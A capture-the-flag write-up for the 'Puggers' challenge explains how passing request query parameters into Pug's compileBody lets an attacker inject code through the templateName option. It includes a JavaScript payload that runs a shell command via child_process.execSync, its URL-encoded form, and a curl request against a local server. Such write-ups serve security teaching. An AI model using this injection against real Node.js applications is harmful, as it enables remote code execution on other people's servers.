# Puggers

Author: samuzora

> It's so poggers when I copy Pug source code so that I don't have to handle new updates

Difficulty: Hard

## Solution

The app uses compileBody straightaway which bypasses some checks that were done earlier. The code was copied over because compileBody isn't exposed in the regular Pug module.

The app passes the entire `req.query` into `compileBody`, which allows the attacker to specify some options.

In [the source code](https://github.com/pugjs/pug/blob/4767cafea0af3d3f935553df0f9a8a6e76d470c2/packages/pug-code-gen/index.js#L173C20-L173C20), the templateName is passed in without any further checks. Thus we can use this to get command injection and hence RCE.

```js
template() { var x = global.process.mainModule.require; return x("child_process").execSync('cat flag.txt'); }; function asdf
```

Encoded is `template%28%29%20%7B%20var%20x%20%3D%20global%2Eprocess%2EmainModule%2Erequire%3B%20return%20x%28%22child%5Fprocess%22%29%2EexecSync%28%27cat%20flag%2Etxt%27%29%3B%20%7D%3B%20function%20asdf%0A`

Pass into `templateName`

```bash
curl http://localhost:7006/?templateName=...
```
